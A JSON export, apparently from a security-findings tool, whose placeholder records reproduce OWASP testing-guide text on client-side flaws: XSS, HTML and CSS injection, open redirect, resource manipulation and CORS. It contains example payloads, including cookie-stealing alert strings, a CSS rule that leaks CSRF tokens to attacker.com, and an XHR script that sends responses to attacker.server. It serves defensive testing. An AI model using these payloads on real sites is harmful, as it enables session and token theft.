Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-02 Testing for JavaScript Execution","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"A JavaScript injection vulnerability is a subtype of cross site scripting (XSS) that involves the ability to inject arbitrary JavaScript code that is executed by the application inside the victim\u2019s browser. This vulnerability can have many consequences, like the disclosure of a user\u2019s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims or the application\u2019s behavior.\nJavaScript injection vulnerabilities can occur when the application lacks proper user-supplied input and output validation. As JavaScript is used to dynamically populate web pages, this injection occurs during this content processing phase and consequently affects the victim.\nWhen testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).\nHere is an example of a script that does not perform any validation of the variable \u0060rr\u0060. The variable contains user-supplied input via the query string, and additionally does not apply any form of encoding:\n\n\u0060\u0060\u0060\nvar rr = location.search.substring(1);\nif(rr) {\n    window.location=decodeURIComponent(rr);\n}\n\u0060\u0060\u0060\n\nThis implies that an attacker could inject JavaScript code simply by submitting the following query string: \u0060www.victim.com/?javascript:alert(1)\u0060.\n\n\u003Cbr\u003E\n","TestingInstructions":"## Test Objectives\n\n* Identify sinks and possible JavaScript injection points.\n\n## How to Test\n\nConsider the following: [DOM XSS exercise](http://www.domxss.com/domxss/01_Basics/04_eval.html)\nThe page contains the following script:\n\n\u0060\u0060\u0060\n\u003Cscript\u003E\nfunction loadObj(){\n    var cc=eval(\u0027(\u0027\u002BaMess\u002B\u0027)\u0027);\n    document.getElementById(\u0027mess\u0027).textContent=cc.message;\n}\n\nif(window.location.hash.indexOf(\u0027message\u0027)==-1) {\n    var aMess=\u0027({\u0022message\u0022:\u0022Hello User!\u0022})\u0027;\n} else {\n    var aMess=location.hash.substr(window.location.hash.indexOf(\u0027message=\u0027)\u002B8)\n}\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nThe above code contains a source \u0060location.hash\u0060 that is controlled by the attacker that can inject directly in the \u0060message\u0060 value a JavaScript Code to take the control of the user browser.","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-03 Testing for HTML Injection","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like disclosure of a user\u2019s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims.\nThis vulnerability occurs when user input is not correctly sanitized and the output is not encoded. An injection allows the attacker to send a malicious HTML page to a victim. The targeted browser will not be able to distinguish (trust) legitimate parts from malicious parts of the page, and consequently will parse and execute the whole page in the victim\u2019s context.\nThere is a wide range of methods and attributes that could be used to render HTML content. If these methods are provided with an untrusted input, then there is an high risk of HTML injection vulnerability. For example, malicious HTML code can be injected via the \u0060innerHTML\u0060 JavaScript method, usually used to render user-inserted HTML code. If strings are not correctly sanitized, the method can enable HTML injection. A JavaScript function that can be used for this purpose is \u0060document.write()\u0060.\nThe following example shows a snippet of vulnerable code that allows an unvalidated input to be used to create dynamic HTML in the page context:\n\n\u0060\u0060\u0060\nvar userposition=location.href.indexOf(\u0022user=\u0022);\nvar user=location.href.substring(userposition\u002B5);\ndocument.getElementById(\u0022Welcome\u0022).innerHTML=\u0022 Hello, \u0022\u002Buser;\n\u0060\u0060\u0060\n\nThe following example shows vulnerable code using the \u0060document.write()\u0060 function:\n\n\u0060\u0060\u0060\nvar userposition=location.href.indexOf(\u0022user=\u0022);\nvar user=location.href.substring(userposition\u002B5);\ndocument.write(\u0022\u003Ch1\u003EHello, \u0022 \u002B user \u002B\u0022\u003C/h1\u003E\u0022);\n\u0060\u0060\u0060\n\nIn both examples, this vulnerability can be exploited with an input such as:\n\n\u0060\u0060\u0060\nhttp://vulnerable.site/page.html?user=\u003Cimg%20src=\u0027aaa\u0027%20onerror=alert(1)\u003E\n\u0060\u0060\u0060\n\nThis input will add an image tag to the page that will execute arbitrary JavaScript code inserted by the malicious user in the HTML context.","TestingInstructions":"## Test Objectives\n\n* Identify HTML injection points and assess the severity of the injected content.\n\n## How to Test\n\nConsider the following DOM XSS exercise [http://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html](http://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html)\nThe HTML code contains the following script:\n\n\u0060\u0060\u0060\n\u003Cscript src=\u0022../js/jquery-1.7.1.js\u0022\u003E\u003C/script\u003E\n\u003Cscript\u003E\nfunction setMessage(){\n    var t=location.hash.slice(1);\n    $(\u0022div[id=\u0022\u002Bt\u002B\u0022]\u0022).text(\u0022The DOM is now loaded and can be manipulated.\u0022);\n}\n$(document).ready(setMessage  );\n$(window).bind(\u0022hashchange\u0022,setMessage)\n\u003C/script\u003E\n\u003Cbody\u003E\n    \u003Cscript src=\u0022../js/embed.js\u0022\u003E\u003C/script\u003E\n    \u003Cspan\u003E\u003Ca href=\u0022#message\u0022 \u003E Show Here\u003C/a\u003E\u003Cdiv id=\u0022message\u0022\u003EShowing Message1\u003C/div\u003E\u003C/span\u003E\n    \u003Cspan\u003E\u003Ca href=\u0022#message1\u0022 \u003E Show Here\u003C/a\u003E\u003Cdiv id=\u0022message1\u0022\u003EShowing Message2\u003C/div\u003E\n    \u003Cspan\u003E\u003Ca href=\u0022#message2\u0022 \u003E Show Here\u003C/a\u003E\u003Cdiv id=\u0022message2\u0022\u003EShowing Message3\u003C/div\u003E\n\u003C/body\u003E\n\u0060\u0060\u0060\n\nIt is possible to inject HTML code.\n\n1. \n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-04 Testing for Client-side URL Redirect","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"This section describes how to check for client-side URL redirection, also known as open redirection. It is an input validation flaw that exists when an application accepts user-controlled input that specifies a link which leads to an external URL that could be malicious. This kind of vulnerability could be used to accomplish a phishing attack or redirect a victim to an infection page.\nThis vulnerability occurs when an application accepts untrusted input that contains a URL value and does not sanitize it. This URL value could cause the web application to redirect the user to another page, such as a malicious page controlled by the attacker.\nThis vulnerability may enable an attacker to successfully launch a phishing scam and steal user credentials. Since the redirection is originated by the real application, the phishing attempts may have a more trustworthy appearance.\nHere is an example of a phishing attack URL.\n\n\u0060\u0060\u0060\nhttp://www.target.site?#redirect=www.fake-target.site\n\u0060\u0060\u0060\n\nThe victim that visits this URL will be automatically redirected to \u0060fake-target.site\u0060, where an attacker could place a fake page that resembles the intended site, in order to steal the victim\u2019s credentials.\nOpen redirection could also be used to craft a URL that would bypass the application\u2019s access control checks and forward the attacker to privileged functions that they would normally not be able to access.","TestingInstructions":"## Test Objectives\n\n* Identify injection points that handle URLs or paths.\n* Assess the locations that the system could redirect to.\n\n## How to Test\n\nWhen testers manually check for this type of vulnerability, they first identify if there are client-side redirections implemented in the client-side code. These redirections may be implemented, to give a JavaScript example, using the \u0060window.location\u0060 object. This can be used to direct the browser to another page by simply assigning a string to it. This is demonstrated in the following snippet:\n\n\u0060\u0060\u0060\nvar redir = location.hash.substring(1);\nif (redir) {\n    window.location=\u0027http://\u0027\u002BdecodeURIComponent(redir);\n}\n\u0060\u0060\u0060\n\nIn this example, the script does not perform any validation of the variable \u0060redir\u0060 which contains the user-supplied input via the query string. Since no form of encoding is applied, this unvalidated input is passed to the \u0060windows.location\u0060 object, creating a URL redirection vulnerability.\nThis implies that an attacker could redirect the victim to a malicious site simply by submitting the following query string:\n\n\u0060\u0060\u0060\nhttp://www.victim.site/?#www.malicious.site\n\u0060\u0060\u0060\n\nWith a slight modification, the above example snippet can be vulnerable to JavaScript injection.\n\n\u0060\u0060\u0060\nvar redir = location.hash.substring(1);\nif (redir) {\n    window.location=decodeURIComponent(redir);\n}\n\u0060\u0060\u0060\n\nThis can be exploited by submitting the following query string:\n\n\u0060\u0060\u0060\nhttp://www.victim.site/?#javascript:alert(document.cookie)\n\u0060\u0060\u0060\n\nWhen testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-05 Testing for CSS Injection","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is rendered inside a victim\u2019s browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross site scripting or data exfiltration.\nThis vulnerability occurs when the application allows user-supplied CSS to interfere with the application\u2019s legitimate style sheets. Injecting code in the CSS context may provide an attacker with the ability to execute JavaScript in certain conditions, or to extract sensitive values using CSS selectors and functions able to generate HTTP requests. Generally, allowing users the ability to customize pages by supplying custom CSS files is a considerable risk.\nThe following JavaScript code shows a possible vulnerable script in which the attacker is able to control the \u0060location.hash\u0060 (source) which reaches the \u0060cssText\u0060 function (sink). This particular case may lead to DOM-based XSS in older browser versions; for more information, see the [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\n\u0060\u0060\u0060\n\u003Ca id=\u0022a1\u0022\u003EClick me\u003C/a\u003E\n\u003Cscript\u003E\n    if (location.hash.slice(1)) {\n    document.getElementById(\u0022a1\u0022).style.cssText = \u0022color: \u0022 \u002B location.hash.slice(1);\n    }\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nThe attacker could target the victim by asking them to visit the following URLs:\n\n* \u0060www.victim.com/#red;-o-link:\u0027\u003Cjavascript:alert(1)\u003E\u0027;-o-link-source:current;\u0060 (Opera [8,12])\n* \u0060www.victim.com/#red;-:expression(alert(URL=1));\u0060 (IE 7/8)\n\nThe same vulnerability may appear in the case of reflected XSS, for example, in the following PHP code:\n\n\u0060\u0060\u0060\n\u003Cstyle\u003E\np {\n    color: \u003C?php echo $_GET[\u0027color\u0027]; ?\u003E;\n    text-align: center;\n}\n\u003C/style\u003E\n\u0060\u0060\u0060\n\nFurther attack scenarios involve the ability to extract data through the adoption of pure CSS rules. Such attacks can be conducted through CSS selectors, leading to the exfiltration of data, for example, CSRF tokens.\nHere is an example of code that attempts to select an input with a \u0060name\u0060 matching \u0060csrf_token\u0060 and a \u0060value\u0060 beginning with an \u0060a\u0060. By utilizing a brute-force attack to determine the attribute\u2019s \u0060value\u0060, it is possible to carry out an attack that sends the value to the attacker\u2019s domain, such as by attempting to set a background image on the selected input element.\n\n\u0060\u0060\u0060\n\u003Cstyle\u003E\ninput[name=csrf_token][value=^a] {\n    background-image: url(http://attacker.com/log?a);\n}\n\u003C/style\u003E\n\u0060\u0060\u0060\n\nOther attacks using solicited content such as CSS are highlighted in [Mario Heiderich\u2019s talk, \u201CGot Your Nose\u201D](https://www.youtube.com/watch?v=FIQvAaZj_HA) on YouTube.","TestingInstructions":"## Test Objectives\n\n* Identify CSS injection points.\n* Assess the impact of the injection.\n\n## How to Test\n\nCode should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the website returns CSS rules on the basis of the inputs should be inspected.\nThe following is a basic example:\n\n\u0060\u0060\u0060\n\u003Ca id=\u0022a1\u0022\u003EClick me\u003C/a\u003E\n\u003Cb\u003EHi\u003C/b\u003E\n\u003Cscript\u003E\n    $(\u0022a\u0022).click(function(){\n        $(\u0022b\u0022).attr(\u0022style\u0022,\u0022color: \u0022 \u002B location.hash.slice(1));\n    });\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nThe above code contains a source \u0060location.hash\u0060, controlled by the attacker, that can inject directly in the \u0060style\u0060 attribute of an HTML element. As mentioned above, this may lead to different results depending on the browser in use and the supplied payload.\nThe following pages provide examples of CSS injection vulnerabilities:\n\n* [Password \u201Ccracker\u201D via CSS and HTML5](http://html5sec.org/invalid/?length=25)\n* [CSS attribute reading](http://eaea.sirdarckcat.net/cssar/v2/)\n* [JavaScript based attacks using \u0060CSSStyleDeclaration\u0060 with unescaped input](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)\n\nFor further OWASP resources on preventing CSS injection, see the [Securing Cascading Style Sheets Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-06 Testing for Client-side Resource Manipulation","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This vulnerability makes it is possible to interfere with the expected application\u2019s behavior by causing it to load and render malicious objects.\nThe following JavaScript code shows a possible vulnerable script in which an attacker is able to control the \u0060location.hash\u0060 (source) which reaches the attribute \u0060src\u0060 of a script element. This particular case leads to a XSS attack as external JavaScript could be injected.\n\n\u0060\u0060\u0060\n\u003Cscript\u003E\n    var d=document.createElement(\u0022script\u0022);\n    if(location.hash.slice(1)) {\n        d.src = location.hash.slice(1);\n    }\n    document.body.appendChild(d);\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nAn attacker could target a victim by causing them to visit this URL:\n\u0060www.victim.com/#http://evil.com/js.js\u0060\nWhere \u0060js.js\u0060 contains:\n\n\u0060\u0060\u0060\nalert(document.cookie)\n\u0060\u0060\u0060\n\nThis would cause the alert to pop up on the victim\u2019s browser.\nA more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker may ask the target page to load malicious content from its own website.\nHere is an example of a vulnerable page:\n\n\u0060\u0060\u0060\n\u003Cb id=\u0022p\u0022\u003E\u003C/b\u003E\n\u003Cscript\u003E\n    function createCORSRequest(method, url) {\n        var xhr = new XMLHttpRequest();\n        xhr.open(method, url, true);\n        xhr.onreadystatechange = function () {\n            if (this.status == 200 \u0026\u0026 this.readyState == 4) {\n                document.getElementById(\u0027p\u0027).innerHTML = this.responseText;\n            }\n        };\n        return xhr;\n    }\n\n    var xhr = createCORSRequest(\u0027GET\u0027, location.hash.slice(1));\n    xhr.send(null);\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nThe \u0060location.hash\u0060 is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct \u0060innerHTML\u0060. An attacker could ask a victim to visit the following URL:\n\u0060www.victim.com/#http://evil.com/html.html\u0060\nWith the payload handler for \u0060html.html\u0060:\n\n\u0060\u0060\u0060\n\u003C?php\nheader(\u0027Access-Control-Allow-Origin: http://www.victim.com\u0027);\n?\u003E\n\u003Cscript\u003Ealert(document.cookie);\u003C/script\u003E\n\u0060\u0060\u0060","TestingInstructions":"## Test Objectives\n\n* Identify sinks with weak input validation.\n* Assess the impact of the resource manipulation.\n\n## How to Test\n\nTo manually check for this type of vulnerability, we must identify whether the application employs inputs without correctly validating them. If so, these inputs are under the control of the user and could be used to specify external resources. Since there are many resources that could be included in the application (such as images, video, objects, css, and iframes), the client-side scripts that handle the associated URLs should be investigated for potential issues.\nThe following table shows possible injection points (sink) that should be checked:\n\n| Resource Type | Tag/Method | Sink |\n| ------------- | ---------- | ---- |\n| Frame | iframe | src |\n| Link | a | href |\n| AJAX Request | \u0060xhr.open(method, [url], true);\u0060 | URL |\n| CSS | link | href |\n| Image | img | src |\n| Object | object | data |\n| Script | script | src |\n\nThe most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that could lead to XSS vulnerabilities.","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-07 Testing Cross Origin Resource Sharing","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":null,"TestingInstructions":"## Test Objectives\n\n* Identify endpoints that implement CORS.\n* Ensure that the CORS configuration is secure or harmless.\n\n## How to Test\n\nA tool such as [ZAP](https://www.zaproxy.org/) can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, in some cases, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input.\n\n### CORS Misconfiguration\n\nSetting the wildcard to the \u0060Access-Control-Allow-Origin header\u0060 (that is, \u0060Access-Control-Allow-Origin: *\u0060) is not secure if the response contains sensitive information. Although it cannot be used with the \u0060Access-Control-Allow-Credentials: true\u0060 at the same time, it can be dangerous where the access control is done solely by the firewall rules or the source IP addresses, other than being protected by credentials.\n\n#### Wildcard Access-Control-Allow-Origin\n\nA tester can check if the \u0060Access-Control-Allow-Origin: *\u0060 exists in the HTTP response messages.\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: *\nContent-Length: 4\nContent-Type: application/xml\n\n[Response Body]\n\u0060\u0060\u0060\n\nIf a response contains sensitive data, an attacker can steal it through the usage of XHR:\n\n\u0060\u0060\u0060\n\u003Chtml\u003E\n    \u003Chead\u003E\u003C/head\u003E\n    \u003Cbody\u003E\n        \u003Cscript\u003E\n            var xhr = new XMLHttpRequest();\n            xhr.onreadystatechange = function() {\n                if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n                    var xhr2 = new XMLHttpRequest();\n                    // attacker.server: attacker listener to steal response\n                    xhr2.open(\u0022POST\u0022, \u0022http://attacker.server\u0022, true);\n                    xhr2.send(xhr.responseText);\n                }\n            };\n            // victim.site: vulnerable server with \u0060Access-Control-Allow-Origin: *\u0060 header \n            xhr.open(\u0022GET\u0022, \u0022http://victim.site\u0022, true);\n            xhr.send();\n        \u003C/script\u003E\n    \u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\n#### Dynamic CORS Policy\n\nA modern web application or API may be implemented to allow cross-origin requests dynamically, generally in order to allow the requests from the sub domains like the following:\n\n\u0060\u0060\u0060\nif (preg_match(\u0027|\\.example.com$|\u0027, $_SERVER[\u0027SERVER_NAME\u0027])) {\n   header(\u0022Access-Control-Allow-Origin: {$_SERVER[\u0027HTTP_ORIGIN\u0027]}\u0022);\n   ...\n}\n\u0060\u0060\u0060\n\nIn this example, all the requests from the subdomains of example.com will be allowed. It must be ensured that the regular expression that is used to match is complete. Otherwise, if it was simply matched with \u0060example.com\u0060 (without \u0060$\u0060 appended), attackers might be able to bypass the CORS policy by appending their domain to the \u0060Origin\u0060 header.\n\n\u0060\u0060\u0060\nGET /test.php HTTP/1.1\nHost: example.com\n[...]\nOrigin: http://example.com.attacker.com\nCookie: \u003Csession cookie\u003E\n\u0060\u0060\u0060\n\nWhen the request above is sent, if the following response is returned with the \u0060Access-Control-Allow-Origin\u0060 whose value is the same as the attacker\u2019s input, the attacker can read the response afterwards and access sensitive information that is only accessible by a victim user.\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: http://example.com.attacker.com\nAccess-Control-Allow-Credentials: true\nContent-Length: 4\nContent-Type: application/xml\n\n[Response Body]\n\u0060\u0060\u0060\n\n### Input Validation Weakness\n\nThe CORS concept can be viewed from a completely different angle. An attacker may allow their CORS policy on purpose to inject code to the target web application.\n\n#### Remote XSS with CORS\n\nThis code makes a request to the resource passed after the \u0060#\u0060 character in the URL, initially used to get resources in the same server.\nVulnerable code:\n\n\u0060\u0060\u0060\n\u003Cscript\u003E\n    var req = new XMLHttpRequest();\n\n    req.onreadystatechange = function() {\n        if(req.readyState==4 \u0026\u0026 req.status==200) {\n            document.getElementById(\u0022div1\u0022).innerHTML=req.responseText;\n        }\n    }\n\n    var resource = location.hash.substring(1);\n    req.open(\u0022GET\u0022,resource,true);\n    req.send();\n\u003C/script\u003E\n\n\u003Cbody\u003E\n    \u003Cdiv id=\u0022div1\u0022\u003E\u003C/div\u003E\n\u003C/body\u003E\n\u0060\u0060\u0060\n\nFor example, a request like this will show the contents of the \u0060profile.php\u0060 file:\n\u0060http://example.foo/main.php#profile.php\u0060\nRequest and response generated by \u0060http://example.foo/profile.php\u0060:\n\n\u0060\u0060\u0060\nGET /profile.php HTTP/1.1\nHost: example.foo\n[...]\nReferer: http://example.foo/main.php\nConnection: keep-alive\n\nHTTP/1.1 200 OK\n[...]\nContent-Length: 25\nContent-Type: text/html\n\n[Response Body]\n\u0060\u0060\u0060\n\nNow, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the \u0060example.foo\u0060 domain, with a URL like this:\n\n\u0060\u0060\u0060\nhttp://example.foo/main.php#http://attacker.bar/file.php\n\u0060\u0060\u0060\n\nRequest and response generated by \u0060http://attacker.bar/file.php\u0060:\n\n\u0060\u0060\u0060\nGET /file.php HTTP/1.1\nHost: attacker.bar\n[...]\nReferer: http://example.foo/main.php\norigin: http://example.foo\n\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: *\nContent-Length: 92\nContent-Type: text/html\n\nInjected Content from attacker.bar \u003Cimg src=\u0022#\u0022 onerror=\u0022alert(\u0027Domain: \u0027\u002Bdocument.domain)\u0022\u003E\n\u0060\u0060\u0060","Details":null,"Implication":null,"Recommendation":null,"References":"* [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)\n* [MDN Cross-Origin Resources Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest (XHR) Level 2 (L2) API in a controlled manner. In the 